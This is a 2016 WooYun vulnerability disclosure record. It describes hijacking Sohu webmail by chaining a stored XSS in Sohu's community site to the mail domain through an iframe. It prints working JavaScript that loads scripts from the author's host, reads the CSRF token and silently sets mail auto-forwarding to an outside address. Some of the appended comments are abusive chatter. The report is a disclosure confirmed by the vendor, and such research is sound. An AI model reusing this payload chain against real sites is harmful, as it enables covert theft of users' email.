{"id": 74085, "wybug_id": "wooyun-2016-0167129", "wybug_title": "利用搜狐邮箱XSS劫持用户邮件", "wybug_corp": "搜狐", "wybug_author": "q601333824", "wybug_date": "2016-01-04 09:38", "wybug_open_date": "2016-02-12 18:49", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "9", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-12：\t细节向公众公开  简要描述： 利用搜狐邮箱XSS劫持用户邮件 详细说明：       1.这个漏洞利用的是函数 \ncontentWindow\n      2.这个函数可以让父窗口获取子窗口的内容，但是前提是同个域,这里举个例子就是，我可以从搜狐社区，获取搜狐邮箱的内容，如图 \n\n     3.接下来就不用我说了，只要找一个搜狐社区的XSS，就能直接XSS搜狐邮箱了,找了一个以前提交的XSS，你们没有修复，就拿来用了 WooYun: 搜狐社区Dom xss,可以修改用户帖子标题和内容(xss filter bypass)      4.XSS就不详细说了，看上面的连接的，于是我在搜狐社区签名的地方插入XSS代码 \n<script src=\"http://q601333824.sinaapp.com/xss1.js\"\n　　　　　　　　　　　　　　　　　↓ \n<br>&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#115;&#114;&#99;&#61;&#34;http://q601333824.sinaapp.com/xss1.js&#34;\n \n\n  ------------------------------------------------------------------------------------------  5.知道存在这个问题，但是怎么利用劫持用户邮件呢,利用邮件自动转发功能 \n\n  6.自动转发功能存在csrf-token,但是这个csrf-token存在网页里面，既然能在搜狐邮箱XSS了，就可以获取csrf-token了，如图    ①.显示在源码\n\n  ②.直接在搜狐社区获取到搜狐邮箱的csrf-token了 \n\n------------------------------------------------------------------------------  6.接下来就是模拟post提交了,可以利用$.ajax,自定义request header,提交csrf-token,但是搜狐邮箱好像不支持$.ajax.,提示，找不到这个方法,因为没有安装jquery库. \n\n  7.,所以，我们可以自己引入一个jquery库不就行了.......如图(这里我就利用w3c菜鸟教程的jquery库) \n\n  8.所以最终代码，有两端，第一段   ①第一段,这段代码为了加载jquery库，为了能让搜狐邮箱支持ajax,然后再往子窗口搜狐邮箱注入XSS代码: \nvar t=document.createElement(\"iframe\");t.setAttribute(\"src\",\"http://mail.sohu.com/\");t.height=\"700\";t.width=\"700\";t.id=\"xss123\";document.body.appendChild(t);function aaa(){    var ccc=document.getElementById(\"xss123\").contentWindow;    var k=ccc.document.createElement(\"script\"); k.setAttribute(\"src\",\"http://www.w3school.com.cn/jquery/jquery.js\");ccc.document.body.appendChild(k);    var b=ccc.document.createElement(\"script\"); b.setAttribute(\"src\",\"http://q601333824.sinaapp.com/xss2.js\");ccc.document.body.appendChild(b);    }setTimeout(\"aaa()\",3000);//\n   ②.第二段,这段代码为了抓取邮箱的csrf-token ,和put提交,自动转发设置好像是put提交的 \nvar token=document.getElementById(\"csrf-token\").content;//获取csrf-tokenvar url=location.href;//获取用户url,因为每个人不一样var url2=url.replace(\"main\",\"profile\");//这里用替换，换成post地址$.ajax({                url: url2,               data: {\"autoreplyenable\":\"false\",\"startyear\":\"2015\",\"startmonth\":\"5\",\"startmonth\":\"5\",\"forwardenable\":\"true\",\"forward\":\"77336@qq.com\",\"_method\":\"put\"},//forward代码转发的邮箱               type: \"PUT\",               beforeSend: function(xhr){xhr.setRequestHeader('X-CSRF-Token', token);},               success: function(data) {               alert(data);               }});\n-------------------------------------------------------------------------------------------  9.测试截图(XSS可以在帖子里触发，详细看上面的XSS漏洞连接)   ①.这里先加载jquery库，然后再加载xss2的连接，然后再put提交，修改转发邮件设置 \n\n   ②.\n\n   ③.\n\n ----------------------------------------------------------------------------------  10.结果就是，搜狐邮箱的转发设置被修改成77336@qq.com了  \n\n    漏洞证明：          1.漏洞证明看上面       2.①.这里先加载jquery库，然后再加载xss2的连接，然后再put提交，修改转发邮件设置 \n\n   ②.\n\n   ③.\n\n ----------------------------------------------------------------------------------  10.结果就是，搜狐邮箱的转发设置被修改成77336@qq.com了  \n\n   修复方案：     1.这个漏洞不要以为光修XSS就没事了，肯定是治标不治本，因为你们网站XSS很多本来就多(=_=)   2.我小白，你们比我厉害   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-01-04 11:21 厂商回复： 感谢对搜狐安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-04 09:43 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1031 漏洞数:237        | 1.乌云最帅的男人                        ...)\t\t \n  复活啦？？    \n     2016-01-04 10:18 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 每日必关注乌云)\t\t \n  打卡    \n     2016-01-04 10:55 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        )\t\t \n  围观    \n     2016-01-04 16:20 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:253 漏洞数:55        | 出自《落第骑士英雄谭》---以我的最弱,击败...)\t\t \n  @牛 小 帅 只是过年了，想要那旺旺大礼包过年，缺点乌云币    \n     2016-01-13 19:31 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:253 漏洞数:55        | 出自《落第骑士英雄谭》---以我的最弱,击败...)\t\t \n  加好友，说什么做个朋友的，一点诚意都没有，拿个小号加别人还有说什么做个朋友的，都他妈的当别人傻逼吗。和小号当朋友，不如找个客服机器人说话,都说过了，我不傻了，不会和以前上当了    \n     2016-01-13 19:41 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:253 漏洞数:55        | 出自《落第骑士英雄谭》---以我的最弱,击败...)\t\t \n  穷人换个集市不容易，要坑人要别人去了    \n     2016-01-13 19:43 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:253 漏洞数:55        | 出自《落第骑士英雄谭》---以我的最弱,击败...)\t\t \n  qq;312723Xxxxx 自重，小号    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}